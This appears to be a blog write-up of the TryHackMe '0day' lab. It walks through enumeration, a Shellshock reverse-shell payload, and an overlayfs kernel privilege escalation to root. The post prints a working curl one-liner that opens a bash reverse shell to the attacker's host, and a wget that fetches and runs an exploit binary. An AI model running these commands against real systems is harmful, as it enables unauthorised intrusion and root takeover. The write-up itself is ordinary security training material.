---
title: "0 day"
date: 2022-09-22T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

{{< image src="/thm/0day/0day.jpeg" alt="0day" position="left" style="width: 200px;" >}}

> "Exploit Ubuntu, like a Turtle in a Hurricane"

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw==
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E=
|   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Gobuster

```
/.hta                 (Status: 403) [Size: 282]
/.htaccess            (Status: 403) [Size: 287]
/.htpasswd            (Status: 403) [Size: 287]
/admin                (Status: 301) [Size: 309] [--> http://10.10.39.85/admin/]
/backup               (Status: 301) [Size: 310] [--> http://10.10.39.85/backup/]
/cgi-bin              (Status: 301) [Size: 311] [--> http://10.10.39.85/cgi-bin/]
/cgi-bin/             (Status: 403) [Size: 286]                                  
/css                  (Status: 301) [Size: 307] [--> http://10.10.39.85/css/]    
/img                  (Status: 301) [Size: 307] [--> http://10.10.39.85/img/]    
/index.html           (Status: 200) [Size: 3025]                                 
/js                   (Status: 301) [Size: 306] [--> http://10.10.39.85/js/]     
/robots.txt           (Status: 200) [Size: 38]                                   
/secret               (Status: 301) [Size: 310] [--> http://10.10.39.85/secret/] 
/server-status        (Status: 403) [Size: 291]                                  
/uploads              (Status: 301) [Size: 311] [--> http://10.10.39.85/uploads/]

```

Lol so many rabbit holes I fell into...

Anyway...google "cgi-bin vulnerabilities" if you didn't know about that yet

[shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) is incredibly famous

## Exploitation

Let's do it manually (there is alot of automated tools online but c'mon...)

```
└──╼ $curl -H 'User-Agent: () { :;}; echo; echo; /bin/bash -i >& /dev/tcp/10.8.226.203/4444 0>&1 ' bash -s : '' http://10.10.88.55/cgi-bin/test.cgi

```
```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 40401
bash: cannot set terminal process group (869): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ 

```

See? Not that hard...

## Privilege escalation


Ok for this one it took me some time

The hint said the machine was very old

```
www-data@ubuntu:/home/ryan$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

```
└──╼ $searchsploit ubuntu 3.13.0
-----------------------------------------------------------------------------------------
 Exploit Title                    |  Path
-----------------------------------------------------------------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation              | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow) 

```
It's called [`overlayfs`](/thm/0day/overlayfs-exploit.c) and it's beautiful

```
└──╼ $gcc overlayfs-exploit.c -o exploit
overlayfs-exploit.c: In function ‘main’:
...

└──╼ $chmod +x exploit
```
Now let's deliver

```
└──╼ $sudo python -m http.server
[sudo] Mot de passe de nair0lf32 : 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

```

www-data@ubuntu:/home/ryan$ cd /tmp
cd /tmp
www-data@ubuntu:/tmp$ wget http://10.8.226.203:8000/exploit
wget http://10.8.226.203:8000/exploit
--2022-09-18 08:46:17--  http://10.8.226.203:8000/exploit
Connecting to 10.8.226.203:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 21072 (21K) [application/octet-stream]
Saving to: 'exploit'

100%[======================================>] 21,072      59.0KB/s   in 0.3s   

2022-09-18 08:46:18 (59.0 KB/s) - 'exploit' saved [21072/21072]

```

```
chmod +x exploit
www-data@ubuntu:/tmp$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
gcc: error trying to exec 'cc1': execvp: No such file or directory
couldn't create dynamic library
```
Ok I have a bit of experience with gcc and already encountered this

```
www-data@ubuntu:/tmp$ echo $PATH                                                              
echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
```
Fix the path

```
www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
<t PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin 
```
And get paid

```
www-data@ubuntu:/tmp$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
